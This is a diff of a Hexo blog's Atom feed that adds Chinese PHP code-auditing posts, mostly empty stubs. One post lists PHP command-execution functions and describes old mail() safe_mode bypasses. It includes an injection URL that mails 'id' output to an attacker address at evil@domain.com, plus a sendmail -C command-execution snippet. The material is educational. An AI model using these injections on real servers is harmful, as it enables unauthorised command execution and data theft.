@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-10-12T14:32:14.423Z</updated>
+  <updated>2024-10-16T01:16:57.603Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,41 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>PHP命令执行漏洞总结（反向）</title>
-    <link href="http://example.com/wiki/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%8D%E5%90%91%EF%BC%89/"/>
-    <id>http://example.com/wiki/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%8D%E5%90%91%EF%BC%89/</id>
+    <title>PHP代码审计三板斧-命令执行漏洞</title>
+    <link href="http://example.com/wiki/PHP-Code_Auditing-Command_Execution_Vulnerability/"/>
+    <id>http://example.com/wiki/PHP-Code_Auditing-Command_Execution_Vulnerability/</id>
     <published>2024-10-12T14:26:28.000Z</published>
-    <updated>2024-10-12T14:32:14.423Z</updated>
+    <updated>2024-10-16T01:16:57.603Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="常见的命令执行函数"><a href="#常见的命令执行函数" class="headerlink" title="常见的命令执行函数"></a>常见的命令执行函数</h2><table><thead><tr><th>常见函数</th><th>参考</th></tr></thead><tbody><tr><td>system()</td><td>system()输出并返回最后一行shell结果。参考:<a href="https://www.php.net/manual/zh/function.system.php">https://www.php.net/manual/zh/function.system.php</a></td></tr><tr><td>exec()</td><td>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。参考:<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></td></tr><tr><td>passthru()</td><td>只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。参考:<a href="https://www.php.net/manual/zh/function.passthru.php">https://www.php.net/manual/zh/function.passthru.php</a></td></tr><tr><td>&#96;&#96;</td><td>参考:<a href="https://www.php.net/manual/zh/language.operators.execution.php">https://www.php.net/manual/zh/language.operators.execution.php</a></td></tr><tr><td>shell_exec()</td><td>参考:<a href="https://www.php.net/manual/zh/function.shell-exec.php">https://www.php.net/manual/zh/function.shell-exec.php</a></td></tr><tr><td>popen()</td><td>不会直接返回执行结果，而是返回一个文件指针。参考:<a href="https://www.php.net/manual/zh/function.popen.php">https://www.php.net/manual/zh/function.popen.php</a></td></tr><tr><td>proc_open()</td><td>不会直接返回执行结果，而是返回一个文件指针。参考:<a href="https://www.php.net/manual/zh/function.proc-open.php">https://www.php.net/manual/zh/function.proc-open.php</a></td></tr><tr><td>pcntl_exec()</td><td>参考:<a href="https://www.php.net/manual/zh/function.pcntl-exec.php">https://www.php.net/manual/zh/function.pcntl-exec.php</a></td></tr><tr><td>mail()</td><td>PHP-4.2.2以下到 PHP-4.0.5版本都存在 PHP mail 函数绕过 safe_mode 限制执行命令漏洞，4.0.5版本开始 mail 函数增加了第五个参数，由于设计者考虑不周可以突破 safe_mode 的</td></tr><tr><td>限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加 shell 命令就可以了</td><td></td></tr></tbody></table><h2 id="常见的命令执行函数-1"><a href="#常见的命令执行函数-1" class="headerlink" title="常见的命令执行函数"></a>常见的命令执行函数</h2><table><thead><tr><th>常见函数</th><th>参考</th></tr></thead><tbody><tr><td>escapeshellarg()</td><td></td></tr><tr><td>escapeshellcmd()</td><td></td></tr></tbody></table><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="1、system"><a href="#1、system" class="headerlink" title="1、system()"></a>1、system()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_1.26lgwy3ig8.webp"></p><h3 id="2、exec"><a href="#2、exec" class="headerlink" title="2、exec()"></a>2、exec()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_2.39l67tzcbs.webp"></p><h3 id="3、passthru"><a href="#3、passthru" class="headerlink" title="3、passthru()"></a>3、passthru()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_3.3k800zekh5.webp"></p><h3 id="4、"><a href="#4、" class="headerlink" title="4、&#96;&#96;"></a>4、&#96;&#96;</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_4.13lrm27okq.webp"></p><h3 id="5、shell-exec"><a href="#5、shell-exec" class="headerlink" title="5、shell_exec()"></a>5、shell_exec()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_5.2rv4j8xyr0.webp"></p><h3 id="6、popen"><a href="#6、popen" class="headerlink" title="6、popen()"></a>6、popen()</h3><h3 id="7、proc-open"><a href="#7、proc-open" class="headerlink" title="7、proc_open()"></a>7、proc_open()</h3><h3 id="8、pcntl-exec"><a href="#8、pcntl-exec" class="headerlink" title="8、pcntl_exec()"></a>8、pcntl_exec()</h3><h3 id="9、mail"><a href="#9、mail" class="headerlink" title="9、mail()"></a>9、mail()</h3><h4 id="（1）古老的PHP-mail-函数绕过-safe-mode-限制执行命令漏洞"><a href="#（1）古老的PHP-mail-函数绕过-safe-mode-限制执行命令漏洞" class="headerlink" title="（1）古老的PHP mail 函数绕过 safe_mode 限制执行命令漏洞"></a>（1）古老的PHP mail 函数绕过 safe_mode 限制执行命令漏洞</h4><p>这个漏洞应该很古老了，我搭建好了可以发邮件的环境，但是没复现出来，应该是PHP版本的问题。<br>PHP-4.2.2以下到 PHP-4.0.5版本都存在 PHP mail 函数绕过 safe_mode 限制执行命令漏洞，4.0.5版本开始 mail 函数增加了第五个参数，由于设计者考虑不周可以突破 safe_mode 的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加 shell 命令就可以了。</p><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_7.9dcyaa20q5.webp"></p><? mail("foo@bar,"foo","bar","",$bar);?><p>执行如下的 URL：<br><a href="http://foo.com/evil.php?bar=;/usr/bin/id%7Cmail">http://foo.com/evil.php?bar=;/usr/bin/id|mail</a> <a href="mailto:&#x65;&#x76;&#105;&#108;&#x40;&#100;&#111;&#109;&#x61;&#x69;&#x6e;&#46;&#99;&#x6f;&#x6d;">&#x65;&#x76;&#105;&#108;&#x40;&#100;&#111;&#109;&#x61;&#x69;&#x6e;&#46;&#99;&#x6f;&#x6d;</a><br>这将 id 执行的结果发送给 <a href="mailto:&#x65;&#118;&#x69;&#x6c;&#x40;&#100;&#x6f;&#109;&#97;&#x69;&#x6e;&#46;&#99;&#111;&#109;">&#x65;&#118;&#x69;&#x6c;&#x40;&#100;&#x6f;&#109;&#97;&#x69;&#x6e;&#46;&#99;&#111;&#109;</a>。<br>对于4.0.6至4.2.2的 PHP 突破 safe_mode 限制其实是利用了 sendmail 的-C参数，所以系统必<br>须是使用 sendmail。如下的代码能够突破 safe_mode 限制执行命令：<br><?PS: 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样$script="/tmp/script123";$cf="/tmp/cf123";$fd = fopen($cf, "w");fwrite($fd, "OQ/tmpSparse=0R$*" . chr(9). "$#local $@ $1 $: $1Mlocal, P=/bin/sh,A=sh $script");fclose($fd);$fd = fopen($script, "w");fwrite($fd, "rm -f $script $cf; ");fwrite($fd, $cmd);fclose($fd);mail("nobody", "", "", "", "-C$cf");?><br>参考链接:<a href="https://www.anquanke.com/post/id/86028">https://www.anquanke.com/post/id/86028</a></p><h2 id="命令执行漏洞构造POC的小技巧"><a href="#命令执行漏洞构造POC的小技巧" class="headerlink" title="命令执行漏洞构造POC的小技巧"></a>命令执行漏洞构造POC的小技巧</h2><p>命令注入的方式有两种：<br>第一种是使用命令自带的参数来拼接命令；<br>第二种是通过拼接来截断原命令；<br>这里面都有一些windows或者linux的特性：</p><p>常常截断命令的方式  （Windows和Linux执行命令的操作方式）<br>原则：<br>1.我们要尝试闭合echo语句。那么我们就要用到;符号。<br>2.让;后的内容失效。这里我们就要使用shell下的单行注释符号#。</p><h3 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="Linux管道符"><a href="#Linux管道符" class="headerlink" title="Linux管道符"></a>Linux管道符</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;常见的命令执行函数&quot;&gt;&lt;a href=&quot;#常见的命令执行函数&quot; class=&quot;headerlink&quot; title=&quot;常见的命令执行函数&quot;&gt;&lt;/a&gt;常见的命令执行函数&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;常见函数&lt;/th&gt;
+&lt;th&gt;参考&lt;/th</summary>
+      
+    
+    
+    
+    <category term="Code auditing" scheme="http://example.com/categories/Code-auditing/"/>
+    
+    
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    
+    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP代码审计三板斧-Sql注入漏洞</title>
+    <link href="http://example.com/wiki/PHP-Code_Auditing-Sql_injection_Vulnerability/"/>
+    <id>http://example.com/wiki/PHP-Code_Auditing-Sql_injection_Vulnerability/</id>
+    <published>2024-10-12T14:26:28.000Z</published>
+    <updated>2024-10-15T12:21:40.927Z</updated>
     
     <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
     
@@ -46,22 +76,60 @@
   </entry>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/wiki/hello-world/"/>
-    <id>http://example.com/wiki/hello-world/</id>
-    <published>2024-10-12T09:11:51.303Z</published>
-    <updated>2024-10-12T09:11:51.303Z</updated>
+    <title>PHP代码审计三板斧-Xss漏洞</title>
+    <link href="http://example.com/wiki/PHP-Code_Auditing-Xss_Vulnerability/"/>
+    <id>http://example.com/wiki/PHP-Code_Auditing-Xss_Vulnerability/</id>
+    <published>2024-10-12T14:26:28.000Z</published>
+    <updated>2024-10-15T12:18:01.123Z</updated>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
       
     
     
     
+    <category term="Code auditing" scheme="http://example.com/categories/Code-auditing/"/>
+    
+    
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    
+    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows病毒分析三板斧-</title>
+    <link href="http://example.com/wiki/Windows-Virus_analysis-Assembly/"/>
+    <id>http://example.com/wiki/Windows-Virus_analysis-Assembly/</id>
+    <published>2024-10-12T14:26:28.000Z</published>
+    <updated>2024-10-15T12:17:49.929Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
+      
+    
+    
+    
+    <category term="Code auditing" scheme="http://example.com/categories/Code-auditing/"/>
+    
+    
+    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
+    
+    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
     
   </entry>
   
